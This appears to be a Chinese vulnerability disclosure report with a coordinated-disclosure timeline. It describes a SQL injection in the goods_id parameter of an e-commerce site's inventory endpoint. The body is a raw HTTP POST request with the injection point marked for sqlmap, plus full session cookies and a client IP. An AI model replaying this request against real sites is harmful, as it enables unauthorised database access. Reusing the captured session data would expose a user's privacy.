漏洞详情 披露状态：   									2015-05-15：	细节已通知厂商并且等待厂商处理中									2015-05-17：	厂商已经确认，细节仅向厂商公开									2015-05-27：	细节向核心白帽子及相关领域专家公开									2015-06-06：	细节向普通白帽子公开									2015-06-16：	细节向实习白帽子公开									2015-07-01：	细节向公众公开  简要描述： 呵呵 详细说明：  POST /flow/inventory/proInv HTTP/1.1Host: www.17ugo.comProxy-Connection: keep-aliveContent-Length: 244Cache-Control: max-age=0Accept: application/json, text/javascript, */*; q=0.01Origin: http://www.17ugo.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.17ugo.com/goods-23469.html?tp=HomePage.1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4Cookie: real_ipd=116.52.220.206; ECS_ID=e2e616631030727490c0c1fb1d8ed3629f47a3de; tanchu=1; OZ_0J_1687=A*AD_shouye_jinribanjia_new*1431661850; bdshare_firstime=1431661853900; _ga=GA1.2.1258467139.1431661827; _gat=1; user_area=30%2C367%2C3100; __utmt=1; __utma=232567135.1258467139.1431661827.1431661827.1431664135.2; __utmb=232567135.2.10.1431664135; __utmc=232567135; __utmz=232567135.1431661827.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); userViewHistory=23469; __ozlvd1687=1431664146; ecshop_affiliate_uid=0; Hm_lvt_7b74f5f61e55127b3a8e6c0f8a2eed17=1431661827; Hm_lpvt_7b74f5f61e55127b3a8e6c0f8a2eed17=1431664160; nTalk_CACHE_DATA={uid:kf_9715_ISME9754_guestE816BCB9-B144-C8,tid:1431661827611449,onlyone:1}; NTKF_T2D_CLIENTID=guestE816BCB9-B144-C878-7B7A-55B1DA91E952; nTalk_PAGE_MANAGE={|m|:[{|60423|:|641780|},{|28788|:|641775|},{|65427|:|641782|}],|t|:|12:29:38|}goods=%7B%22quick%22%3A1%2C%22spec%22%3A%5B%5D%2C%22stylecolor%22%3A%220%22%2C%22goods_id%22%3A%2223469*%22%2C%22number%22%3A1%2C%22product_id%22%3A%2268056%22%2C%22mark%22%3A0%2C%22parent%22%3A0%7D&region=%5B%2230%22%2C%22367%22%2C%223100%22%5Dgoods_id存在注入,sqlmap需要自定义注射点
